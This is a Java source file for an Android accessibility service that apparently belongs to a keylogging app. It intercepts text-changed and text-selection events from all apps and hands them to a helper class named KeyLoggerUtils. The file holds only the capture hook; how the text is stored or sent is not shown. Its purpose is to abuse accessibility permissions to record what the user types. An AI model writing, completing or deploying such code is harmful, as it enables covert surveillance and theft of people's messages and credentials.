package com.vikasyadavnsit.cdc.services;

import static com.vikasyadavnsit.cdc.utils.KeyLoggerUtils.processTextChangedEvent;

import android.accessibilityservice.AccessibilityService;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

import com.vikasyadavnsit.cdc.utils.LoggerUtils;

public class MyAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Handle accessibility events, such as keystrokes / text changed events
        if (isTextChangedEvent(event)) {
            processTextChangedEvent(event);
        }
    }

    @Override
    public void onServiceConnected() {
        LoggerUtils.d("MyAccessibilityService", "Service Connected");
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        //LoggerUtils.d("AccessibilityService", "Key Event Received: ${event?.keyCode}");
        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {
        // Handle interruption, if necessary
    }

    private static boolean isTextChangedEvent(AccessibilityEvent event) {
        return event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
                || event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED;
    }
}
